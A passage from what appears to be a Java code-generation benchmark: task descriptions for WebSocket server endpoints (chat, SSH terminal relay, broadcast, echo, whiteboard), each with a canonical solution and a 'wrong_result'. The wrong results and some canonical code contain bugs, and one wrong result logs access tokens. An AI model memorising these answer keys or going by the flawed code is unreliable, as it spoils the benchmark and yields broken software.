    "Canonical_solution": "import cn.hutool.json.JSONUtil;\nimport cn.lili.common.security.AuthUser;\nimport cn.lili.common.security.context.UserContext;\nimport cn.lili.common.security.enums.UserEnums;\nimport cn.lili.modules.im.config.CustomSpringConfigurator;\nimport cn.lili.modules.im.entity.vo.MessageVO;\nimport cn.lili.modules.im.entity.enums.MessageResultType;\nimport cn.lili.modules.im.entity.vo.MessageOperation;\nimport com.alibaba.fastjson.JSON;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(value = \"/lili/webSocket/{accessToken}\", configurator = CustomSpringConfigurator.class)\n@Scope(\"prototype\")\npublic class WebSocketServer {\n\n    private static ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(@PathParam(\"accessToken\") String accessToken, Session session) {\n        AuthUser authUser = UserContext.getAuthUser(cache, accessToken);\n        String sessionId = UserEnums.STORE.equals(authUser.getRole()) ? authUser.getStoreId() : authUser.getId();\n        if (sessionPools.containsKey(sessionId)) {\n            Session oldSession = sessionPools.get(sessionId);\n            sendMessage(oldSession,\n                MessageVO.builder().messageResultType(MessageResultType.OFFLINE).result(\"\u7528\u6237\u5f02\u5730\u767b\u9646\").build());\n            try {\n                oldSession.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        sessionPools.put(sessionId, session);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"accessToken\") String accessToken) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        sessionPools.remove(authUser);\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"accessToken\") String accessToken, String msg) {\n        MessageOperation messageOperation = JSON.parseObject(msg, MessageOperation.class);\n        operation(accessToken, messageOperation);\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        switch (messageOperation.getOperationType()) {\n            case MESSAGE:\n                sendMessage(messageOperation.getTo(), new MessageVO(MessageResultType.MESSAGE, imMessage));\n                break;\n            case READ:\n                break;\n            case UNREAD:\n                sendMessage(authUser.getId(),\n                    new MessageVO(MessageResultType.UN_READ, imMessageService.unReadMessages(accessToken)));\n                break;\n            case HISTORY:\n                sendMessage(authUser.getId(), new MessageVO(MessageResultType.HISTORY,\n                    imMessageService.historyMessage(accessToken, messageOperation.getTo())));\n                break;\n            default:\n                break;\n        }\n    }\n\n    private void sendMessage(String sessionId, MessageVO message) {\n        Session session = sessionPools.get(sessionId);\n        sendMessage(session, message);\n    }\n\n    private void sendMessage(Session session, MessageVO message) {\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(JSON.toJSONString(message, true));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/websocket\")\npublic class WebSocketServer {\n\n    private static final ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(String accessToken, Session session) {\n        Session existingSession = sessionPools.get(accessToken);\n        if (existingSession != null) {\n            try {\n                existingSession.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            sessionPools.remove(accessToken);\n        }\n        sessionPools.put(accessToken, session);\n    }\n\n    @OnClose\n    public void onClose(String accessToken) {\n        sessionPools.remove(accessToken);\n    }\n\n    @OnMessage\n    public void onMessage(String accessToken, String msg) {\n        try {\n            JSONObject jsonObject = new JSONObject(msg);\n            MessageOperation operation = MessageOperation.valueOf(jsonObject.getString(\"operation\"));\n            operation(accessToken, operation);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        switch (messageOperation) {\n            case SEND:\n                MessageVO messageVO = new MessageVO(\"Sample message content\");\n                sendMessage(accessToken, messageVO);\n                break;\n            case READ_STATUS:\n                // Implement status reading logic\n                break;\n            case GET_HISTORY:\n                // Implement history retrieval logic\n                break;\n            default:\n                break;\n        }\n    }\n\n    private void sendMessage(String sessionId, MessageVO message) {\n        Session session = sessionPools.get(sessionId);\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(message.toString());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void sendMessage(Session session, MessageVO message) {\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(message.toString());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        throwable.printStackTrace();\n        session.close();\n    }\n}"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, disconnections, and errors using Java EE WebSocket API.\n\nClass Description: The WebsocketServerEndpoint class is a WebSocket server endpoint that manages client connections and message handling. It uses annotations to define WebSocket lifecycle events and maintains a map of message handlers for different message types.\n\nAttributes:\n- logger: Logger - Used for logging server events and errors\n- HANDLERS: Map<String, MessageHandler> - Static map storing message handlers keyed by message type\n\nMethods:\n- onOpen(Session session, EndpointConfig config) -> void - Handles new client connections, authenticates using access token from request parameters\n- onMessage(Session session, String message) -> void - Processes incoming messages from clients, delegates to appropriate message handler\n- onClose(Session session, CloseReason closeReason) -> void - Handles client disconnections, cleans up session\n- onError(Session session, Throwable throwable) -> void - Handles WebSocket communication errors\n- getMessageClass(MessageHandler handler) -> Class<? extends Message> - Helper method to determine message class type from handler's generic type information",
    "Canonical_solution": "import cn.iocoder.springboot.lab25.springwebsocket.handler.MessageHandler;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.AuthRequest;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.Message;\nimport cn.iocoder.springboot.lab25.springwebsocket.util.WebSocketUtil;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.aop.framework.AopProxyUtils;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@ServerEndpoint(\"/\")\npublic class WebsocketServerEndpoint {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"[onOpen][session({}) connected]\", session);\n        List<String> accessTokenValues = session.getRequestParameterMap().get(\"accessToken\");\n        String accessToken = !CollectionUtils.isEmpty(accessTokenValues) ? accessTokenValues.get(0) : null;\n        AuthRequest authRequest = new AuthRequest().setAccessToken(accessToken);\n        MessageHandler<AuthRequest> messageHandler = HANDLERS.get(AuthRequest.TYPE);\n        if (messageHandler == null) {\n            logger.error(\"[onOpen][Auth message type, no message handler found]\");\n            return;\n        }\n        messageHandler.execute(session, authRequest);\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"[onMessage][session({}) received message({})]\", session, message);\n        try {\n            JSONObject jsonMessage = JSON.parseObject(message);\n            String messageType = jsonMessage.getString(\"type\");\n            MessageHandler messageHandler = HANDLERS.get(messageType);\n            if (messageHandler == null) {\n                logger.error(\"[onMessage][Message type({}) has no handler]\", messageType);\n                return;\n            }\n            Class<? extends Message> messageClass = getMessageClass(messageHandler);\n            Message messageObj = JSON.parseObject(jsonMessage.getString(\"body\"), messageClass);\n            messageHandler.execute(session, messageObj);\n        } catch (Throwable throwable) {\n            logger.error(\"[onMessage][session({}) error processing message]\", session, throwable);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"[onClose][session({}) disconnected. Reason: {}]\", session, closeReason);\n        WebSocketUtil.removeSession(session);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"[onError][session({}) error occurred]\", session, throwable);\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Class<?> targetClass = AopProxyUtils.ultimateTargetClass(handler);\n        Type[] interfaces = targetClass.getGenericInterfaces();\n        Class<?> superclass = targetClass.getSuperclass();\n        while ((Objects.isNull(interfaces) || interfaces.length == 0) && Objects.nonNull(superclass)) {\n            interfaces = superclass.getGenericInterfaces();\n            superclass = targetClass.getSuperclass();\n        }\n        if (Objects.nonNull(interfaces)) {\n            for (Type type : interfaces) {\n                if (type instanceof ParameterizedType) {\n                    ParameterizedType parameterizedType = (ParameterizedType) type;\n                    if (Objects.equals(parameterizedType.getRawType(), MessageHandler.class)) {\n                        Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n                        if (Objects.nonNull(actualTypeArguments) && actualTypeArguments.length > 0) {\n                            return (Class<Message>) actualTypeArguments[0];\n                        }\n                    }\n                }\n            }\n        }\n        throw new IllegalStateException(String.format(\"Cannot determine message type for handler %s\", handler));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "import javax.websocket.*;\nimport java.util.*;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\n\n@ServerEndpoint(\"/websocket\")\npublic class WebsocketServerEndpoint {\n\n    private static final Logger logger = Logger.getLogger(WebsocketServerEndpoint.class.getName());\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    static {\n        HANDLERS.put(\"chat\", new ChatMessageHandler());\n        HANDLERS.put(\"notification\", new NotificationMessageHandler());\n    }\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        String queryString = session.getQueryString();\n        if (queryString != null) {\n            String token = extractAccessToken(queryString);\n            logger.info(\"Client connected with token: \" + token);\n        }\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        String messageType = determineMessageType(message);\n        MessageHandler handler = HANDLERS.get(messageType);\n        if (handler != null) {\n            Class<?> msgClass = getMessageClass(handler);\n            try {\n                Object msg = deserialize(message, msgClass);\n                handler.handle(session, msg);\n            } catch (Exception e) {\n                logger.severe(\"Error processing message: \" + e.getMessage());\n            }\n        } else {\n            logger.warning(\"Unknown message type: \" + messageType);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"Client disconnected: \" + closeReason.getReasonPhrase());\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"Error occurred: \" + throwable.getMessage());\n    }\n\n    private String extractAccessToken(String queryString) {\n        if (queryString == null) return null;\n        String[] params = queryString.split(\"&\");\n        for (String param : params) {\n            if (param.startsWith(\"token=\")) {\n                return param.substring(6);\n            }\n        }\n        return null;\n    }\n\n    private String determineMessageType(String message) {\n        if (message.startsWith(\"type:\")) {\n            return message.substring(5);\n        }\n        return \"unknown\";\n    }\n\n    private Object deserialize(String message, Class<?> clazz) {\n        if (clazz.equals(ChatMessage.class)) {\n            return new ChatMessage(message);\n        } else if (clazz.equals(NotificationMessage.class)) {\n            return new NotificationMessage(message);\n        }\n        return null;\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Type type = handler.getClass().getGenericSuperclass();\n        if (type instanceof ParameterizedType) {\n            ParameterizedType pt = (ParameterizedType) type;\n            return (Class<? extends Message>) pt.getRawType();\n        }\n        return Message.class;\n    }\n\n    public static class MessageHandler<T> {\n        private final Class<T> messageClass;\n\n        public MessageHandler() {\n            this.messageClass = (Class<T>) getClass().getGenericSuperclass();\n        }\n\n        public Class<? extends Message> getMessageClass() {\n            return messageClass;\n        }\n\n        public abstract void handle(Session session, T message);\n    }\n\n    public static class ChatMessageHandler extends MessageHandler<ChatMessage> {\n    }\n\n    public static class NotificationMessageHandler extends MessageHandler<NotificationMessage> {\n    }\n\n    public static class ChatMessage {\n        private String content;\n\n        public ChatMessage(String content) {\n            this.content = content;\n        }\n    }\n\n    public static class NotificationMessage {\n        private String type;\n\n        public NotificationMessage(String content) {\n            this.type = content;\n        }\n    }\n}"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for secure shell terminal communication, handling client connections, message exchange, and session management.\n\nClass Description: SecureShellWS is a Java EE WebSocket endpoint that facilitates secure shell terminal interactions between clients and servers. It manages terminal sessions, processes keyboard input commands, and handles connection lifecycle events.\n\nAttributes:\n- log: [Logger] - Logger instance for error and debug logging\n- keyMap: [Map<Integer, byte[]>] - Static mapping of key codes to their corresponding byte sequences for terminal control\n- httpSession: [HttpSession] - HTTP session associated with the WebSocket connection\n- session: [Session] - WebSocket session object for the current connection\n- sessionId: [Long] - Unique identifier for the terminal session\n\nMethods:\n- onOpen: [onOpen](Session session, EndpointConfig config) -> void - Handles new WebSocket connections, initializes session parameters, and starts output thread\n- onMessage: [onMessage](String message) -> void - Processes incoming JSON messages containing terminal commands or key inputs\n- onError: [onError](Session session, Throwable t) -> void - Handles WebSocket communication errors\n- onClose: [onClose]() -> void - Cleans up resources when WebSocket connection is closed, terminating all associated terminal sessions",
    "Canonical_solution": "import com.google.gson.Gson;\nimport io.bastillion.common.util.AppConfig;\nimport io.bastillion.common.util.AuthUtil;\nimport io.bastillion.manage.control.SecureShellKtrl;\nimport io.bastillion.manage.db.UserDB;\nimport io.bastillion.manage.model.SchSession;\nimport io.bastillion.manage.model.UserSchSessions;\nimport io.bastillion.manage.task.SentOutputTask;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.http.HttpSession;\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@ServerEndpoint(value = \"/admin/terms.ws\", configurator = GetHttpSessionConfigurator.class)\npublic class SecureShellWS {\n\n    private static final Logger log = LoggerFactory.getLogger(SecureShellWS.class);\n    private static final Map<Integer, byte[]> keyMap = new HashMap<>();\n\n    static {\n        keyMap.put(27, new byte[]{(byte) 0x1b});\n        keyMap.put(13, new byte[]{(byte) 0x0d});\n        keyMap.put(37, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x44});\n        keyMap.put(38, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x41});\n        keyMap.put(39, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x43});\n        keyMap.put(40, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x42});\n        keyMap.put(8, new byte[]{(byte) 0x7f});\n        keyMap.put(9, new byte[]{(byte) 0x09});\n        keyMap.put(17, new byte[]{});\n        keyMap.put(46, \"\\033[3~\".getBytes());\n        keyMap.put(45, \"\\033[2~\".getBytes());\n        keyMap.put(33, \"\\033[5~\".getBytes());\n        keyMap.put(34, \"\\033[6~\".getBytes());\n        keyMap.put(35, \"\\033[4~\".getBytes());\n        keyMap.put(36, \"\\033[1~\".getBytes());\n    }\n\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        if (StringUtils.isNotEmpty(AppConfig.getProperty(\"websocketTimeout\"))) {\n            session.setMaxIdleTimeout(Long.parseLong(AppConfig.getProperty(\"websocketTimeout\")) * 60000);\n        } else {\n            session.setMaxIdleTimeout(0);\n        }\n\n        this.httpSession = (HttpSession) config.getUserProperties().get(HttpSession.class.getName());\n        try {\n            this.sessionId = AuthUtil.getSessionId(httpSession);\n            this.session = session;\n            new Thread(new SentOutputTask(sessionId, session, UserDB.getUser(AuthUtil.getUserId(httpSession)))).start();\n        } catch (GeneralSecurityException | SQLException ex) {\n            log.error(ex.toString(), ex);\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        if (session.isOpen() && StringUtils.isNotEmpty(message) && !\"heartbeat\".equals(message)) {\n            try {\n                Map jsonRoot = new Gson().fromJson(message, Map.class);\n                String command = (String) jsonRoot.get(\"command\");\n                Integer keyCode = null;\n                Double keyCodeDbl = (Double) jsonRoot.get(\"keyCode\");\n                if (keyCodeDbl != null) {\n                    keyCode = keyCodeDbl.intValue();\n                }\n\n                for (String idStr : (ArrayList<String>) jsonRoot.get(\"id\")) {\n                    Integer id = Integer.parseInt(idStr);\n                    UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n                    if (userSchSessions != null) {\n                        SchSession schSession = userSchSessions.getSchSessionMap().get(id);\n                        if (keyCode != null && keyMap.containsKey(keyCode)) {\n                            schSession.getCommander().write(keyMap.get(keyCode));\n                        } else {\n                            schSession.getCommander().print(command);\n                        }\n                    }\n                }\n                AuthUtil.setTimeout(httpSession);\n            } catch (IOException ex) {\n                log.error(ex.toString(), ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.error(t.toString(), t);\n    }\n\n    @OnClose\n    public void onClose() {\n        UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n        if (userSchSessions != null) {\n            Map<Integer, SchSession> schSessionMap = userSchSessions.getSchSessionMap();\n            for (Integer sessionKey : schSessionMap.keySet()) {\n                SchSession schSession = schSessionMap.get(sessionKey);\n                schSession.getChannel().disconnect();\n                schSession.getSession().disconnect();\n                schSessionMap.remove(sessionKey);\n            }\n            schSessionMap.clear();\n            SecureShellKtrl.getUserSchSessionMap().remove(sessionId);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/terminal\")\npublic class SecureShellWS {\n    private static final Logger log = LoggerFactory.getLogger(SecureShellWS.class);\n    private static final Map<Integer, byte[]> keyMap = new HashMap<>();\n    static {\n        keyMap.put(27, new byte[]{(byte) 27});\n        keyMap.put(91, new byte[]{(byte) 91});\n        keyMap.put(65, new byte[]{(byte) 65});\n        keyMap.put(66, new byte[]{(byte) 66});\n        keyMap.put(67, new byte[]{(byte) 67});\n        keyMap.put(68, new byte[]{(byte) 68});\n        keyMap.put(127, new byte[]{(byte) 127});\n    }\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        this.session = session;\n        this.httpSession = session.getHttpSession();\n        this.sessionId = System.currentTimeMillis();\n        new Thread(this::outputLoop).start();\n    }\n\n    private void outputLoop() {\n        while (true) {\n            try {\n                session.getBasicRemote().sendText(\"Output data\");\n                Thread.sleep(100);\n            } catch (Exception e) {\n                log.error(\"Output loop error\", e);\n                break;\n            }\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        try {\n            JSONObject json = new JSONObject(message);\n            String type = json.getString(\"type\");\n            if (\"command\".equals(type)) {\n                String cmd = json.getString(\"command\");\n                // Execute command and send output\n            } else if (\"key\".equals(type)) {\n                int keyCode = json.getInt(\"keyCode\");\n                byte[] bytes = keyMap.get(keyCode);\n                if (bytes != null) {\n                    session.getBasicRemote().sendBytes(bytes);\n                }\n            }\n        } catch (Exception e) {\n            log.error(\"Message processing error\", e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.error(\"WebSocket error\", t);\n        session.close();\n    }\n\n    @OnClose\n    public void onClose() {\n        log.info(\"Connection closed\");\n        session.close();\n    }\n}"
  },
  {
    "Task_id": 484,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles client connections, messages, and broadcasts messages to connected clients.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections, processes incoming messages, and provides functionality for sending messages to single or multiple clients. It uses annotations to define WebSocket lifecycle methods and maintains connection state.\n\nAttributes:\n- session: [Session] - The current WebSocket session for this endpoint instance\n- webSockets: [CopyOnWriteArraySet<WebSocketServer>] - Thread-safe set of all active WebSocket connections\n- sessionPool: [Map<String, Session>] - Mapping of user IDs to their corresponding WebSocket sessions\n\nMethods:\n- onOpen: [onOpen(Session session, @PathParam(\"userId\") String userId)] -> [void] - Handles new WebSocket connections and stores the session\n- onClose: [onClose()] -> [void] - Handles WebSocket connection closure and cleans up resources\n- onMessage: [onMessage(String message)] -> [void] - Processes incoming messages from clients\n- onError: [onError(Session session, Throwable error)] -> [void] - Handles WebSocket communication errors\n- sendAllMessage: [sendAllMessage(String message)] -> [void] - Broadcasts a message to all connected clients\n- sendOneMessage: [sendOneMessage(String userId, String message)] -> [void] - Sends a message to a specific client identified by user ID\n- sendMoreMessage: [sendMoreMessage(String[] userIds, String message)] -> [void] - Sends a message to multiple specified clients",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@Component\n@Slf4j\n@ServerEndpoint(\"/websocket/{userId}\")\npublic class WebSocketServer {\n\n    private Session session;\n    private static final CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static final Map<String, Session> sessionPool = new HashMap<String, Session>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(value = \"userId\") String userId) {\n        try {\n            this.session = session;\n            webSockets.add(this);\n            sessionPool.put(userId, session);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6709\u65b0\u7684\u8fde\u63a5\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnClose\n    public void onClose() {\n        try {\n            webSockets.remove(this);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u8fde\u63a5\u65ad\u5f00\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6536\u5230\u5ba2\u6237\u7aef\u6d88\u606f:\" + message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendAllMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u5e7f\u64ad\u6d88\u606f:\" + message);\n        for (WebSocketServer webSocket : webSockets) {\n            try {\n                if (webSocket.session.isOpen()) {\n                    webSocket.session.getAsyncRemote().sendText(message);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null && session.isOpen()) {\n            try {\n                log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                session.getAsyncRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null && session.isOpen()) {\n                try {\n                    log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                    session.getAsyncRemote().sendText(message);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/websocket\")\npublic class WebSocketServer {\n    private Session session;\n    private static final CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static final Map<String, Session> sessionPool = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"userId\") String userId) {\n        this.session = session;\n        webSockets.add(this);\n        sessionPool.put(userId, session);\n        session.setAttribute(\"userId\", userId);\n    }\n\n    @OnClose\n    public void onClose() {\n        String userId = session.getAttribute(\"userId\");\n        webSockets.remove(this);\n        sessionPool.remove(userId);\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendAllMessage(String message) {\n        for (WebSocketServer ws : webSockets) {\n            try {\n                ws.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null) {\n                try {\n                    session.getBasicRemote().sendText(message);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data communication asynchronously using ByteBuffer.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data from clients and echoes it back asynchronously. The endpoint is mapped to the \"/bytebuffer\" path and uses Java's WebSocket API for communication.\n\nAttributes: None\n\nMethods:\n- echoByteBuffer(ByteBuffer data, Session session) -> void - Handles incoming binary messages from WebSocket clients. Receives the binary data as a ByteBuffer and the client's Session object, then asynchronously sends the same data back to the client. The method uses the session's async remote endpoint to send the response without blocking.\n\nInput:\n- data: ByteBuffer - The binary data received from the client\n- session: Session - The WebSocket session object representing the client connection\n\nOutput: None (The method sends data back to the client through the session object but doesn't return anything)",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class MyAsyncEndpointByteBuffer {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/bytebuffer\")\npublic class ByteBufferEndpoint {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles real-time communication between multiple clients, specifically for broadcasting figures and binary data snapshots to connected peers.\n\nClass Description: The Whiteboard class is a WebSocket server endpoint that manages client connections and facilitates real-time data broadcasting. It maintains a list of connected peers and provides methods to handle connection events (open/close) and message broadcasting (figures and binary data).\n\nAttributes:\n- LOGGER: Logger - Used for logging server activities and debugging information\n- PRESENT: Object - A dummy object used as a value in the peers ConcurrentMap\n- peers: ConcurrentMap<Session, Object> - Thread-safe collection storing all connected client sessions\n\nMethods:\n- onOpen(Session peer) -> void - Handles new WebSocket connections by adding the client session to the peers map\n- onClose(Session peer) -> void - Handles WebSocket disconnections by removing the client session from the peers map\n- broadcastFigure(Figure figure, Session session) -> void - Broadcasts a Figure object to all connected clients except the sender\n- broadcastSnapshot(ByteBuffer data, Session session) -> void - Broadcasts binary data to all connected clients except the sender",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\",\n    encoders = { FigureEncoder.class },\n    decoders = { FigureDecoder.class })\npublic class Whiteboard {\n\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n    }\n\n    @OnMessage\n    public void broadcastFigure(Figure figure, Session session) throws IOException, EncodeException {\n        LOGGER.log(Level.INFO, \"boradcastFigure: {0}\", figure);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendObject(figure);\n            }\n        }\n    }\n\n    @OnMessage\n    public void broadcastSnapshot(ByteBuffer data, Session session) throws IOException {\n        LOGGER.log(Level.INFO, \"broadcastBinary: {0}\", data);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendBinary(data);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
